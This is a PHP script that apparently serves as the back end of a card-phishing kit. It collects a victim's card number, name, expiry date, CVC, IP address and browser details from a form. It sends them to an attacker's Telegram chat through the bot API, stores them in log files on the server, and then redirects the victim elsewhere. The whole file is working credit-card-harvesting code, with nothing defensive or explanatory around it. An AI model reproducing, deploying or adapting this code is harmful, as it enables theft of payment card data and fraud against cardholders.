<?php

$number = $_POST['creditcard'];
$names = $_POST['names'];
$exp = $_POST['month'] . '/' . $_POST['year'];
$cvc = $_POST['cvc'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$filename =  $_SERVER['DOCUMENT_ROOT'] . '/details/setting.json';
$sendbot = 'false';

$json_data = file_get_contents($filename);
$data = json_decode($json_data, true);
if ($data && !empty($data['api_tg']) && !empty($data['chat_id_user'])) {
    $sendbot = 'true';
    /*setting telegram bot */
    $datio="[ OS ]: CARDESC PAY 🧾\n | card number: $number \n | date: $exp \n | cvv: $cvc \n\n[ details ] 🧊 \n | ip: $ip \n | Information: $agent";
    $apiToken = $data['api_tg'];
    $data = [
        'chat_id' => $data['chat_id_user'],
        'text' => $datio
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data));
}

$logFile = $_SERVER['DOCUMENT_ROOT'] . "/details/log.log";
$logEntry = "\r\nx.add_row(['PAY', '$number', '$exp', '$cvc', '$ip','$sendbot'])";
file_put_contents($logFile, $logEntry, FILE_APPEND);

$resultFile = $_SERVER['DOCUMENT_ROOT'] . "/details/result.log";
$resultFile = str_replace("dist/details/", "", $resultFile);
$resultEntry = "[OS]: CARDESC PAY" . "\n [Name]: $names \n [Card Number]: $number \n [Date]: $exp\n [CVV2]: $cvc\n [send bot]: $sendbot\n [ip]: $ip \n [Information]: $agent \n\n";
file_put_contents($resultFile, $resultEntry, FILE_APPEND);
$reloc = file_get_contents("location.location");
?>

<script>
    window.location.href = "<?php echo $reloc ?>"
</script>
